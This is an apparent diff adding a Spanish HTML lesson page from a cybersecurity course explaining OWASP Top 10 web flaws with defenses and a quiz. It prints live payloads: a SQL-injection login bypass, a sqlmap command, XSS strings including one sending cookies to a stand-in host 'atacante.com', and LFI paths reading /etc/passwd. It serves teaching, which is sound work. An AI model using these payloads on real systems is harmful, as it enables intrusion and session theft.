@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Lección 09: Hacking Web — OWASP Top 10 explicado con ejemplos prácticos: SQL Injection, XSS, CSRF, IDOR y más.">
+    <title>Lección 09: Hacking Web — CyberPath 2026</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800;900&family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+        <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+    <link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+    <div class="bg-grid"></div>
+    <div class="bg-glow bg-glow-1"></div>
+    <div class="bg-glow bg-glow-2"></div>
+    <nav class="navbar" id="navbar"><a href="../index.html" class="nav-brand" style="text-decoration:none"><div class="brand-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="brand-text">Cyber<span class="accent">Path</span> 2026</span></a></nav>
+
+    <main class="lesson-page">
+        <div class="lesson-breadcrumb"><a href="../index.html">Inicio</a><span>›</span><span>Fase 2</span><span>›</span><span>Lección 09</span></div>
+
+        <div class="lesson-hero">
+            <div class="lesson-phase-badge" style="background:rgba(255,171,0,0.15);color:#ffab00">Fase 2 — Pentesting Fundamental</div>
+            <h1>Hacking Web — OWASP Top 10 explicado y practicado</h1>
+            <p class="lesson-intro">
+                Las aplicaciones web son el <strong>vector de ataque más explotado</strong> del mundo. Casi todo hoy es una app web: 
+                bancos, tiendas, redes sociales, paneles de administración. En esta lección aprenderás las <strong>10 vulnerabilidades 
+                web más críticas según OWASP</strong>, cómo funcionan, cómo explotarlas y cómo defenderse contra ellas.
+            </p>
+            <div class="concept-box" style="margin-top:1.25rem">
+                <h4>📋 Prerrequisito</h4>
+                <p>Esta lección asume que completaste la <strong><a href="leccion-08b-web-fundamentals.html" style="color:var(--accent-cyan)">Lección 08B: Fundamentos Web</a></strong>, donde se explican HTML, HTTP, cookies y SQL básico.</p>
+            </div>
+        </div>
+
+        <div class="lesson-toc">
+            <h3>📋 Contenido de esta lección</h3>
+            <ol>
+                <li><a href="#owasp">¿Qué es OWASP?</a></li>
+                <li><a href="#sqli">SQL Injection (SQLi)</a></li>
+                <li><a href="#xss">Cross-Site Scripting (XSS)</a></li>
+                <li><a href="#csrf">Cross-Site Request Forgery (CSRF)</a></li>
+                <li><a href="#idor">IDOR — Insecure Direct Object Reference</a></li>
+                <li><a href="#lfi-rfi">LFI / RFI — Inclusión de archivos</a></li>
+                <li><a href="#auth">Autenticación rota</a></li>
+                <li><a href="#otros">Otras vulnerabilidades del OWASP Top 10</a></li>
+                <li><a href="#practica">Práctica: DVWA y WebGoat</a></li>
+            </ol>
+        </div>
+
+        <!-- SECTION 1 -->
+        <div class="lesson-section" id="owasp">
+            <h2><span class="section-icon">🌐</span> 1. ¿Qué es OWASP?</h2>
+            <p class="lesson-text">
+                <strong>OWASP (Open Web Application Security Project)</strong> es una comunidad abierta que publica estándares, 
+                herramientas y guías de seguridad web. Su publicación más famosa es el <strong>OWASP Top 10</strong>: 
+                la lista de las 10 vulnerabilidades más críticas en aplicaciones web, actualizada cada pocos años.
+            </p>
+        </div>
+
+        <!-- SECTION 2: SQLi -->
+        <div class="lesson-section" id="sqli">
+            <h2><span class="section-icon">💉</span> 2. SQL Injection (SQLi)</h2>
+            <p class="lesson-text">
+                La <strong>inyección SQL</strong> ocurre cuando un atacante puede insertar código SQL malicioso en un campo de entrada 
+                que la aplicación envía directamente a la base de datos sin validar.
+            </p>
+
+            <div class="lesson-terminal">
+                <div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">SQL Injection — Ejemplo paso a paso</span></div>
+                <pre><code><span style="color:#546e7a"># Código PHP vulnerable (NO hagas esto):</span>
+$query = "SELECT * FROM users WHERE user='$username' AND pass='$password'";
+
+<span style="color:#546e7a"># Si el atacante escribe en el campo de usuario:</span>
+<span style="color:#ff5252">admin' OR '1'='1' -- </span>
+
+<span style="color:#546e7a"># La consulta se convierte en:</span>
+SELECT * FROM users WHERE user='<span style="color:#ff5252">admin' OR '1'='1' -- </span>' AND pass=''
+
+<span style="color:#546e7a"># Desglose:</span>
+<span style="color:#546e7a"># admin'        → cierra la comilla del campo user</span>
+<span style="color:#546e7a"># OR '1'='1'    → siempre verdadero, devuelve todos los registros</span>
+<span style="color:#546e7a"># --            → comenta el resto de la consulta (ignora la contraseña)</span>
+
+<span style="color:#546e7a"># Resultado: acceso como admin sin conocer la contraseña</span>
+
+<span style="color:#546e7a"># Tipos de SQLi:</span>
+<span style="color:#546e7a"># 1. In-band (Classic): ves el resultado en la página</span>
+<span style="color:#546e7a"># 2. Blind: no ves resultado directo, pero puedes inferir datos</span>
+<span style="color:#546e7a">#    - Boolean-based: la página cambia según true/false</span>
+<span style="color:#546e7a">#    - Time-based: usas SLEEP() para inferir datos por el retardo</span>
+<span style="color:#546e7a"># 3. Out-of-band: extraes datos por canales alternativos (DNS, HTTP)</span></code></pre>
+                <div class="explanation">
+                    <p><strong>Herramienta automática:</strong> <code>sqlmap</code> automatiza la detección y explotación de SQLi. Uso: <code>sqlmap -u "http://target/page?id=1" --dbs</code></p>
+                    <p><strong>Defensa:</strong> Usar <strong>consultas parametrizadas</strong> (prepared statements) y <strong>nunca concatenar input del usuario</strong> directamente en SQL.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- SECTION 3: XSS -->
+        <div class="lesson-section" id="xss">
+            <h2><span class="section-icon">📝</span> 3. Cross-Site Scripting (XSS)</h2>
+            <p class="lesson-text">
+                <strong>XSS</strong> ocurre cuando un atacante puede inyectar código JavaScript malicioso en una página web 
+                que otros usuarios verán. El código se ejecuta en el navegador de la víctima.
+            </p>
+
+            <div class="lesson-table-wrap">
+                <table class="lesson-table">
+                    <thead><tr><th>Tipo</th><th>Cómo funciona</th><th>Ejemplo</th></tr></thead>
+                    <tbody>
+                        <tr><td><strong>Reflected XSS</strong></td><td>El script malicioso va en la URL y se refleja en la respuesta.</td><td><code>http://site.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
+                        <tr><td><strong>Stored XSS</strong></td><td>El script se guarda en la base de datos y se ejecuta para todos los usuarios que vean esa página.</td><td>Comentario en un foro con <code>&lt;script&gt;</code> que roba cookies de todos los lectores.</td></tr>
+                        <tr><td><strong>DOM-based XSS</strong></td><td>El script se ejecuta manipulando el DOM del navegador sin pasar por el servidor.</td><td>JavaScript del cliente lee un parámetro de la URL y lo inserta sin sanitizar.</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <div class="lesson-terminal">
+                <div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Payloads XSS comunes</span></div>
+                <pre><code><span style="color:#546e7a"># Payload básico de prueba</span>
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+<span style="color:#546e7a"># Robar cookie de sesión (Stored XSS)</span>
+&lt;script&gt;
+  new Image().src="http://atacante.com/steal?c="+document.cookie;
+&lt;/script&gt;
+
+<span style="color:#546e7a"># Bypass de filtros</span>
+&lt;img src=x onerror="alert('XSS')"&gt;
+&lt;svg onload="alert('XSS')"&gt;
+&lt;body onload="alert('XSS')"&gt;</code></pre>
+                <div class="explanation">
+                    <p><strong>Defensa:</strong> <strong>Escapar toda salida</strong> (HTML encoding), usar <code>Content-Security-Policy</code> headers, y marcar cookies como <code>HttpOnly</code> (no accesibles por JavaScript).</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- SECTION 4: CSRF -->
+        <div class="lesson-section" id="csrf">
+            <h2><span class="section-icon">🔄</span> 4. Cross-Site Request Forgery (CSRF)</h2>
+            <p class="lesson-text">
+                <strong>CSRF</strong> engaña al navegador de la víctima para que haga una petición a un sitio donde ya está autenticada, 
+                sin que ella lo sepa. El navegador envía automáticamente las cookies de sesión.
+            </p>
+            <div class="analogy-box">
+                <span class="analogy-icon">✉️</span>
+                <h4>Analogía: carta firmada sin leer</h4>
+                <p>
+                    Imagina que alguien te da un documento para firmar y tú firmas sin leerlo. Resulta que era una transferencia bancaria. 
+                    Eso es CSRF: el atacante crea una petición maliciosa y tu navegador la "firma" automáticamente con tu sesión activa.
+                </p>
+            </div>
+            <div class="concept-box">
+                <h4>💡 Defensa contra CSRF</h4>
+                <p>Usar <strong>tokens CSRF</strong>: cada formulario incluye un token secreto único que el servidor verifica. El atacante no puede conocer este token.</p>
+            </div>
+        </div>
+
+        <!-- SECTION 5: IDOR -->
+        <div class="lesson-section" id="idor">
+            <h2><span class="section-icon">🔓</span> 5. IDOR — Insecure Direct Object Reference</h2>
+            <p class="lesson-text">
+                <strong>IDOR</strong> ocurre cuando una aplicación usa identificadores directos (IDs) para acceder a recursos 
+                sin verificar que el usuario tiene permiso.
+            </p>
+            <div class="lesson-terminal">
+                <div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">IDOR — Ejemplo</span></div>
+                <pre><code><span style="color:#546e7a"># Tu perfil:</span>
+https://app.com/profile?id=1234   <span style="color:#546e7a">← tu ID</span>
+
+<span style="color:#546e7a"># ¿Qué pasa si cambias el ID?</span>
+https://app.com/profile?id=1235   <span style="color:#546e7a">← ¡ves el perfil de otro usuario!</span>
+https://app.com/profile?id=1      <span style="color:#546e7a">← ¡posiblemente el admin!</span>
+
+<span style="color:#546e7a"># Más ejemplos:</span>
+https://app.com/invoice/download?id=5001   <span style="color:#546e7a">← factura de otro cliente</span>
+https://api.com/v1/user/999/messages       <span style="color:#546e7a">← mensajes privados de otro</span></code></pre>
+                <div class="explanation">
+                    <p><strong>IDOR es sorprendentemente común</strong> y una de las vulnerabilidades más reportadas en Bug Bounty. Siempre que veas un ID numérico en una URL, intenta cambiarlo.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- SECTION 6: LFI/RFI -->
+        <div class="lesson-section" id="lfi-rfi">
+            <h2><span class="section-icon">📂</span> 6. LFI / RFI — Inclusión de archivos</h2>
+            <p class="lesson-text">
+                <strong>LFI (Local File Inclusion)</strong> permite leer archivos del servidor. <strong>RFI (Remote File Inclusion)</strong> 
+                permite incluir archivos externos (potencialmente maliciosos).
+            </p>
+            <div class="lesson-terminal">
+                <div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">LFI — Ejemplo</span></div>
+                <pre><code><span style="color:#546e7a"># URL normal:</span>
+https://site.com/page?file=about.php
+
+<span style="color:#546e7a"># LFI — leer /etc/passwd del servidor:</span>
+https://site.com/page?file=../../../../etc/passwd
+
+<span style="color:#546e7a"># LFI — leer logs de Apache (para log poisoning):</span>
+https://site.com/page?file=../../../../var/log/apache2/access.log</code></pre>
+            </div>
+        </div>
+
+        <!-- SECTION 7 -->
+        <div class="lesson-section" id="auth">
+            <h2><span class="section-icon">🔑</span> 7. Autenticación rota</h2>
+            <p class="lesson-text">Vulnerabilidades comunes en la autenticación:</p>
+            <ul>
+                <li><strong>Credenciales por defecto:</strong> admin/admin, admin/password, root/toor.</li>
+                <li><strong>Sin rate limiting:</strong> puedes hacer fuerza bruta ilimitada sin bloqueo.</li>
+                <li><strong>Tokens predecibles:</strong> cookies de sesión o tokens de reset con patrones adivinables.</li>
+                <li><strong>Sin MFA:</strong> solo contraseña, sin segundo factor de autenticación.</li>
+                <li><strong>Enumeración de usuarios:</strong> el error "usuario no encontrado" vs "contraseña incorrecta" revela qué usuarios existen.</li>
+            </ul>
+        </div>
+
+        <!-- SECTION 8 -->
+        <div class="lesson-section" id="otros">
+            <h2><span class="section-icon">📊</span> 8. Otras vulnerabilidades del OWASP Top 10</h2>
+            <div class="lesson-table-wrap">
+                <table class="lesson-table">
+                    <thead><tr><th>Vulnerabilidad</th><th>Descripción</th></tr></thead>
+                    <tbody>
+                        <tr><td><strong>Configuración incorrecta</strong></td><td>Páginas de debug habilitadas en producción, directorios expuestos, headers de servidor reveladores.</td></tr>
+                        <tr><td><strong>Componentes vulnerables</strong></td><td>Usar librerías o frameworks desactualizados con vulnerabilidades conocidas (ej: Log4Shell).</td></tr>
+                        <tr><td><strong>SSRF (Server-Side Request Forgery)</strong></td><td>Hacer que el servidor realice peticiones a recursos internos (acceder a metadata de AWS, etc.).</td></tr>
+                        <tr><td><strong>Deserialización insegura</strong></td><td>Manipular objetos serializados para ejecutar código arbitrario en el servidor.</td></tr>
+                        <tr><td><strong>Logging insuficiente</strong></td><td>No registrar eventos de seguridad, impidiendo la detección de ataques.</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- SECTION 9 -->
+        <div class="lesson-section" id="practica">
+            <h2><span class="section-icon">🏋️</span> 9. Práctica: DVWA y WebGoat</h2>
+            <p class="lesson-text">
+                Para practicar hacking web de forma segura, usa estas aplicaciones vulnerables en tu laboratorio:
+            </p>
+            <ul>
+                <li><strong>DVWA (Damn Vulnerable Web Application):</strong> Instala en tu lab con <code>docker run -d -p 80:80 vulnerables/web-dvwa</code></li>
+                <li><strong>WebGoat (OWASP):</strong> <code>docker run -d -p 8080:8080 webgoat/webgoat</code></li>
+                <li><strong>bWAPP:</strong> Otra aplicación web vulnerable con +100 bugs</li>
+                <li><strong>Juice Shop (OWASP):</strong> Tienda web moderna con vulnerabilidades reales</li>
+            </ul>
+
+            <div class="practice-box">
+                <h4>✅ ¿Completaste esta lección?</h4>
+                <p>Asegúrate de poder:</p>
+                <ul>
+                    <li>Explicar qué es SQL Injection y cómo funciona</li>
+                    <li>Distinguir entre Reflected XSS, Stored XSS y DOM-based XSS</li>
+                    <li>Entender cómo funciona CSRF y cómo se previene</li>
+                    <li>Detectar y explotar IDOR cambiando IDs en URLs</li>
+                    <li>Explicar la diferencia entre LFI y RFI</li>
+                    <li>Haber practicado al menos SQLi y XSS en DVWA</li>
+                </ul>
+            </div>
+        
+            <div class="external-labs">
+                <h4>🔗 Practica en plataformas reales</h4>
+                <ul>
+                    <li><a href="https://tryhackme.com/room/owasptop10" target="_blank" rel="noopener noreferrer">TryHackMe: OWASP Top 10</a><span class="lab-tag lab-tag-free">Gratis</span></li>
+                    <li><a href="https://tryhackme.com/room/dvwa" target="_blank" rel="noopener noreferrer">TryHackMe: DVWA</a><span class="lab-tag lab-tag-free">Gratis</span></li>
+                    <li><a href="https://tryhackme.com/room/owaspjuiceshop" target="_blank" rel="noopener noreferrer">TryHackMe: Juice Shop</a><span class="lab-tag lab-tag-free">Gratis</span></li>
+                    <li><a href="https://tryhackme.com/room/sqlinjectionlm" target="_blank" rel="noopener noreferrer">TryHackMe: SQL Injection</a><span class="lab-tag lab-tag-free">Gratis</span></li>
+                </ul>
+            </div>
+
+            <div class="quiz-box" id="quiz-container"></div>
+        </div>
+
+        <div class="lesson-nav">
+            <a href="leccion-08b-web-fundamentals.html"><span class="nav-label">← Anterior</span><span class="nav-title">Lección 08B: Fundamentos Web</span></a>
+            <a href="leccion-10-burpsuite.html" class="next"><span class="nav-label">Siguiente →</span><span class="nav-title">Lección 10: Burp Suite</span></a>
+        </div>
+    </main>
+    <footer class="footer"><div class="container"><div class="footer-content"><p style="color:var(--text-muted);font-size:0.85rem;text-align:center">CyberPath 2026 — Curso Completo de Ciberseguridad</p></div></div></footer>
+
+    <script src="../quiz.js"></script>
+    <script>
+        const quizQuestions = [
+          {
+                    "question": "¿Qué es SQL Injection?",
+                    "options": [
+                              "Un ataque que explota vulnerabilidades en el sistema operativo del servidor",
+                              "La inyección de código SQL malicioso en campos de entrada que la aplicación envía sin validar a la base de datos",
+                              "Un método de cifrado de bases de datos",
+                              "Un tipo de escaneo de puertos"
+                    ],
+                    "correct": 1
+          },
+          {
+                    "question": "¿Cuál es la diferencia entre Reflected XSS y Stored XSS?",
+                    "options": [
+                              "No hay diferencia, son lo mismo",
+                              "Reflected XSS se ejecuta solo en el servidor, Stored XSS solo en el cliente",
+                              "Reflected XSS viene en la URL/respuesta inmediata, Stored XSS se guarda en la base de datos y afecta a todos los usuarios que visitan esa página",
+                              "Reflected XSS es más peligroso que Stored XSS"
+                    ],
+                    "correct": 2
+          },
+          {
+                    "question": "¿Qué es CSRF (Cross-Site Request Forgery)?",
+                    "options": [
+                              "Un ataque que inyecta JavaScript malicioso en una página",
+                              "Un ataque que fuerza al navegador de una víctima autenticada a enviar una petición no deseada a una aplicación web",
+                              "Un tipo de inyección SQL avanzada",
+                              "Un método para robar cookies directamente del servidor"
+                    ],
+                    "correct": 1
+          },
+          {
+                    "question": "¿Qué es IDOR (Insecure Direct Object Reference)?",
+                    "options": [
+                              "Un ataque de fuerza bruta contra contraseñas",
+                              "Cuando la aplicación expone referencias directas a objetos internos (como IDs) sin verificar que el usuario tenga permiso de acceso",
+                              "Un tipo de cifrado inseguro",
+                              "Una vulnerabilidad exclusiva de APIs REST"
+                    ],
+                    "correct": 1
+          }
+];
+        window._quizQuestions = window._quizQuestions || {};
+        window._quizQuestions['leccion-09'] = quizQuestions;
+        document.addEventListener('DOMContentLoaded', () => {
+            CyberQuiz.init('leccion-09', quizQuestions);
+            const explanations = [
+                "SQL Injection ocurre cuando la app concatena input del usuario directamente en queries SQL sin sanitizar. Permite extraer datos, bypassear login, e incluso ejecutar comandos.",
+                "Reflected XSS se inyecta en la URL y se refleja en la respuesta (afecta solo a quien haga clic). Stored XSS se almacena en la BD y se ejecuta para TODOS los visitantes — mucho más peligroso.",
+                "CSRF aprovecha que el navegador envía cookies automáticamente. Si estás logueado en tu banco y visitas un sitio malicioso, este puede hacer peticiones a tu banco con tu sesión activa.",
+                "IDOR ocurre cuando cambias un ID en la URL (ej: /perfil?id=123 → id=124) y accedes a datos de otro usuario. La app no verifica autorización — solo checa autenticación."
+            ];
+            document.querySelectorAll('.quiz-question').forEach((q, i) => {
+                if (explanations[i]) q.dataset.explanation = explanations[i];
+            });
+        });
+    </script>
+</body>
+</html>
